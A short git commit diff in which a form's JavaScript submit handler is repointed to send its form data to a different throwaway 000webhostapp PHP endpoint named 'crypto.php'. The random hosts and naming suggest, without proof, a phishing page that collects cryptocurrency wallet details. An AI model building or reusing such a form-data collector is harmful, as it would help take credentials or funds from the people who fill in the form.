64fcf5c6c0e3621041ace7f5872e0a97a39fa596
saltlake-outpost <98303682+saltlake-outpost@users.noreply.github.com>
2022-11-03 19:08:01 +0200

    Update js1.js

--- js/js1.js
+++ js/js1.js
@@ -85,7 +85,7 @@ form.addEventListener('submit', function(e) {
 
     $.ajax({
         type: "POST",
-        url: "https://turfier-twist.000webhostapp.com/crypto-post.php",
+        url: "https://fenestral-licenses.000webhostapp.com/crypto.php",
         data: formData,
         enctype: 'multipart/form-data',
         processData: false,
